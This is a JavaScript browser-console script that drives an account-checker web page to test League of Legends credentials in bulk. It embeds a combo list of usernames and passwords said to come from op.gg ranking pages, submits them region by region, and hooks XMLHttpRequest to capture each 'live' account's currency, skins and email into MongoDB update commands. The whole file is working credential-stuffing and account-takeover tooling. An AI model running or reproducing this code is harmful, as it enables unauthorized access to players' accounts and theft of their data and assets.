(async () => {
  const copyToClipboard = str => {
    const el = document.createElement('textarea');
    el.value = str;
    document.body.appendChild(el);
    el.select();
    document.execCommand('copy');
    document.body.removeChild(el);
  };
  const list = document.getElementById('cclist');
  const server = document.getElementById('server');
  let accounts = [
    {
        "UserName" : "Tatane123",
        "Password" : "tatane123",
        "FromUrl" : "https://euw.op.gg/ranking/level/page=94428"
    },
    {
        "UserName" : "Quotennescha",
        "Password" : "abc123",
        "FromUrl" : "https://euw.op.gg/ranking/level/page=94422"
    },
    {
        "UserName" : "fitipaly",
        "Password" : "fitipaly1",
        "FromUrl" : "https://euw.op.gg/ranking/level/page=94423"
    }
  ];
  const serverMapper = {
    "1": url => url.startsWith("https://br.op.gg"),
    "2": url => url.startsWith("https://eune.op.gg"),
    "3": url => url.startsWith("https://euw.op.gg"),
    "4": url => url.startsWith("https://jp.op.gg"),
    "5": url => url.startsWith("https://www.op.gg"),
    "6": url => url.startsWith("https://lan.op.gg"),
    "7": url => url.startsWith("https://las.op.gg"),
    "8": url => url.startsWith("https://na.op.gg"),
    "9": url => url.startsWith("https://oce.op.gg"),
    "11": url => url.startsWith("https://ru.op.gg"),
    "12": url => url.startsWith("https://tr.op.gg"),
    GetAccounts() {
      const keys = Object.keys(this);
      const accs = {};
      for (let i = 0; i < keys.length; i += 1) {
        if (isNaN(+keys[i])) continue;
        for (let ii = 0; ii < accounts.length; ii += 1) {
          if (this[keys[i]](accounts[ii].FromUrl)) {
            if (!accs[keys[i]]) accs[keys[i]] = [];
            accs[keys[i]].push(accounts[ii]);
          }
        }
      }
      return accs;
    }
  };
  accounts = serverMapper.GetAccounts();
  const keys = Object.keys(accounts);
  let currKey = 0;
  const updates = [];
  const getUpdate = data => updates.map(update => `db.Accounts.updateOne(${JSON.stringify(update.where)}, ${JSON.stringify(update.set)})`).join(';\n');

  const oldXHR = window.XMLHttpRequest;
  function newXHR() {
      var realXHR = new oldXHR();
      realXHR.addEventListener("readystatechange", function() {
        if (realXHR.readyState !== realXHR.DONE) return;
        try {
          if (realXHR.status < 200 || realXHR.status > 299) throw new Error('Not 200');
          const body = JSON.parse(realXHR.response);
          console.log(body);
          if (body.sonuc !== 'canli') return;
          const table = document.createElement('table');
          table.innerHTML = body.icerik;
          const trs = table.getElementsByTagName('tr');
          for (let i = 0; i < trs.length; i += 1) {
            const tr = trs[i];
            const [, userData, capture] = tr.getElementsByTagName('td');
            const [UserName] = userData.innerHTML.split(':');
            let [RP, BlueEssence, Level, RefundsRemaining, TotalChamps, TotalSkins, Email, EmailVerified] = capture.innerHTML.split('<br>');
            updates.push({
              where: { UserName },
              set: {
                $set: {
                  RP: +RP.split(':')[1].trim() || 0,
                  BlueEssence: +BlueEssence.split(':')[1].trim() || 0,
                  RefundsRemaining: +RefundsRemaining.split(':')[1].trim() || 0,
                  TotalChamps: +TotalChamps.split(':')[1].trim() || 0,
                  TotalSkins: +TotalSkins.split(':')[1].trim() || 0,
                  Email: TotalSkins.split(':')[1].trim() || '',
                  EmailVerified: EmailVerified.split(':')[1].trim() === 'Verified',
                }
              }
            });
            console.log(updates);
            console.clear();
            console.log(getUpdate(updates));
          }
          currKey += 1;
          if (keys[currKey]) startQuery(accounts[keys[currKey]]);
        } catch(e) {}
      }, false);
      return realXHR;
  }
  window.XMLHttpRequest = newXHR;

  // console.clear();
  function startQuery(accs) {
    const submit = document.getElementById('submit');
    let comboText = '';
    for (let i = 0; i < accs.length; i += 1) {
      if (i !== 0) comboText += '\n';
      comboText += accs[i].UserName + ':' + accs[i].Password;
    }
    list.value = comboText;
    server.value = keys[currKey];
    submit.click();
  }
  setTimeout(() => startQuery(accounts[keys[currKey]]), 1500);
})();
